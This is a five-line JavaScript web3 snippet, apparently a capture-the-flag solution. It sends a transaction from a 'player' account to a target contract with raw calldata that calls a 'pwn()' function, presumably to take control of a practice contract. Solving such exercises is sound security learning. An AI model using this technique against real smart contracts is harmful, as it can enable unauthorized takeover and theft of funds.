await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: web3.eth.abi.encodeFunctionSignature("pwn()")
});
